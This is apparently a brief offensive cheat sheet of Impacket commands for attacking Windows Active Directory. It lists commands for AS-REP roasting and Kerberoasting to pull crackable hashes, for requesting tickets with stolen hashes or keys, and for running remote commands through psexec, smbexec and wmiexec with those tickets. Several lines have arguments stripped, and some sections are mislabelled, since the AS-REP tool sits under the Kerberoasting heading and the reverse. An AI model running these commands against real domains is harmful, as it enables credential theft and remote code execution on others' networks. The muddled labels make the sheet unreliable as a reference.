# Impacket Kerberoasting

## Check for Kerberoasting:

- GetNPUsers.py DOMAIN-Target/ -usersfile user.txt -dc-ip
    
    -format hashcat/john
    

## GetUserSPNs

ASREPRoast: - impacket-GetUserSPNs /: -request -format <AS_REP_responses_format [hashcat | john]> -outputfile  - impacket-GetUserSPNs / -usersfile  -format <AS_REP_responses_format [hashcat | john]> -outputfile

Kerberoasting: - impacket-GetUserSPNs /: -outputfile

Overpass The Hash/Pass The Key (PTK): - python3 getTGT.py / -hashes [lm_hash]: - python3 getTGT.py / -aesKey  - python3 getTGT.py /:[password]

## Using TGT key to excute remote commands from the following impacket scripts:

- python3 psexec.py
    
    /@ -k -no-pass
    
- python3 smbexec.py
    
    /@ -k -no-pass
    
- python3 wmiexec.py
    
    /@ -k -no-pass